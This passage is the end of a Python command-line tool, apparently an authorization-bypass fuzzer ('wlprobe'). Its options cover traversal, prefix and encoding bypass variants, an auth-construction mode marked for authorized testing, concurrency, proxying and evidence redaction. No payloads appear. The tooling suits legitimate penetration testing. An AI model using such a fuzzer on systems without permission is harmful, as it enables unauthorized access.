    p.add_argument("--bypass-categories", dest="bypass_categories", default=None,
                   help="阶段二类别过滤（默认全量；如 借道前缀,目录穿越,编码解码）")
    p.add_argument("--bypass-cap", dest="bypass_cap", type=int, default=400,
                   help="阶段二每目标变形上限（默认 400，按类别轮转截取）")
    p.add_argument("--probe-auth", dest="probe_auth", action="store_true",
                   help="阶段二启用认证构造类变形（仅限授权测试）")
    p.add_argument("--combine", action="store_true", help="阶段二启用双因子组合引擎")
    p.add_argument("--threshold", type=float, default=0.9,
                   help="evaluate 判定阈值（默认 0.9，与 authz_bypass_v3_4 一致语义）")
    p.add_argument("--abort-after", dest="abort_after", type=int, default=8,
                   help="连续失败 N 次后熔断（默认 8）")
    p.add_argument("--max-redirect-trace", dest="max_redirect_trace", type=int, default=8,
                   help="重定向链追踪样本上限（默认 8，0 关闭）")
    p.add_argument("--no-evidence", dest="no_evidence", action="store_true",
                   help="不保存命中证据文件")
    p.add_argument("--redact-evidence", dest="redact_evidence", action="store_true",
                   help="证据文件中的手机号/身份证/邮箱/银行卡脱敏")
    # 通用
    p.add_argument("--proxy", default=None, help="HTTP(S) 代理")
    p.add_argument("--delay", type=float, default=0.1, help="请求最小间隔秒（默认 0.1）")
    p.add_argument("--concurrency", type=int, default=8, help="并发数（默认 8）")
    p.add_argument("--timeout", type=float, default=15.0, help="单请求超时秒（默认 15）")
    p.add_argument("--prefix-cap", dest="prefix_cap", type=int, default=150,
                   help="借道全积变形上限（默认 150）")
    p.add_argument("--out", default=None, help="报告文件名前缀（默认 wlprobe_<时间>）")
    return p.parse_args()


def main():
    if hasattr(sys.stdout, "reconfigure"):
        try:
            sys.stdout.reconfigure(encoding="utf-8", errors="replace")
            sys.stderr.reconfigure(encoding="utf-8", errors="replace")
        except (OSError, ValueError):
            pass
    args = parse_args()
    try:
        sys.exit(asyncio.run(run(args)))
    except KeyboardInterrupt:
        print("\n[!] 用户中断")
        sys.exit(130)


if __name__ == "__main__":
    main()
